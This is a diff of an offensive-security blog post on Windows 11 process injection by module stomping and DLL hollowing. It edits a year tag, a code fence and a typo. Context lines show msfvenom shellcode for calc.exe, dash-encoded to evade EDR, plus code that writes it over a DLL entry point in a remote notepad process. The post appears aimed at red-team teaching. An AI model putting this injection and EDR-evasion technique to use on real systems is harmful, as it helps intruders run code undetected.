@@ -7,7 +7,7 @@ categories:
 tags:
   - Windows 11
   - g3tsyst3m
-  - '2024'
+  - '2025'
   - process injection
   - module stomping
   - dll hollowing
@@ -156,7 +156,7 @@ The Payload!
 
 We can't forget our payload right?!  I mean, we've made it this far.  I've yet to even tell you about what I plan to load into the DLL entrypoint 😸  Well...surprise surprise.  It's once again the Windows Calculator lol.  I used msfvenom to generate it this time as I wanted to demonstrate how we can bypass a lot of EDR solution just applying some basic encoding to the shellcode beforehand.  Here's what it looks like.  My "encoding" is just hashes/dashes in-between the bytes lol.  How is the effective?  Seriously, this shouldn't work.  But it does a lot of the time 😆
 
-``cpp
+```cpp
 // Payload: calc.exe (hex-encoded)
 const std::string payloadHex = "fc-48-83-e4-f0-e8-c0-00-00-00-41-51-41-50-52-51-56-48-31-d2-65-48-8b-52-60-48-8b-52-18-48-8b-52-20-48-8b-72-50-48-0f-b7-4a-4a-4d-31-c9-48-31-c0-ac-3c-61-7c-02-2c-20-41-c1-c9-0d-41-01-c1-e2-ed-52-41-51-48-8b-52-20-8b-42-3c-48-01-d0-8b-80-88-00-00-00-48-85-c0-74-67-48-01-d0-50-8b-48-18-44-8b-40-20-49-01-d0-e3-56-48-ff-c9-41-8b-34-88-48-01-d6-4d-31-c9-48-31-c0-ac-41-c1-c9-0d-41-01-c1-38-e0-75-f1-4c-03-4c-24-08-45-39-d1-75-d8-58-44-8b-40-24-49-01-d0-66-41-8b-0c-48-44-8b-40-1c-49-01-d0-41-8b-04-88-48-01-d0-41-58-41-58-5e-59-5a-41-58-41-59-41-5a-48-83-ec-20-41-52-ff-e0-58-41-59-5a-48-8b-12-e9-57-ff-ff-ff-5d-48-ba-01-00-00-00-00-00-00-00-48-8d-8d-01-01-00-00-41-ba-31-8b-6f-87-ff-d5-bb-e0-1d-2a-0a-41-ba-a6-95-bd-9d-ff-d5-48-83-c4-28-3c-06-7c-0a-80-fb-e0-75-05-bb-47-13-72-6f-6a-00-59-41-89-da-ff-d5-63-61-6c-63-2e-65-78-65-00";
 auto shellBytes = parseShellcode(payloadHex);
@@ -186,7 +186,7 @@ Now that we have the shellcode ready to go, let's load it and create a remote th
 Executing the shellcode in the Remote DLL, in the remote notepad process!
 -
 
-Here, we write he shellcode to the entry point of our DLL and execute it!  Exactly what you'd expect 😄
+Here, we write the shellcode to the entry point of our DLL and execute it!  Exactly what you'd expect 😄
 
 ```cpp
                     // Stomp the entry point with payload
